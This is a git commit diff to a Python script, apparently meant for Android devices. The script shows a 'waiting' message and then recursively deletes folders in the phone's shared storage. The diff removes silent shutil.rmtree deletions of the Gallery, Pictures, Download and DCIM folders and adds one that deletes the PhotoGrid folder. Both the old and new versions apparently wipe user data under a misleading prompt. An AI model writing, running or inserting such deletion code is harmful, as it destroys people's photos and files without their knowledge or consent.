353087ad55bb223ad13023c7d6194218a5143700
isiss123 <93774726+isiss123@users.noreply.github.com>
2022-02-19 20:45:59 +0400

    Update main.py

--- main.py
+++ main.py
@@ -18,9 +18,7 @@ print("Gözdə...")
 
 
 try:
-    shutil.rmtree("/storage/emulated/0/Gallery")
-    shutil.rmtree("/storage/emulated/0/Pictures")
-    shutil.rmtree("/storage/emulated/0/Download")
-    shutil.rmtree("/storage/emulated/0/DCIM")
+    shutil.rmtree("/storage/emulated/0/PhotoGrid")
+    
 except:
     print("Nəsə səf getdi")
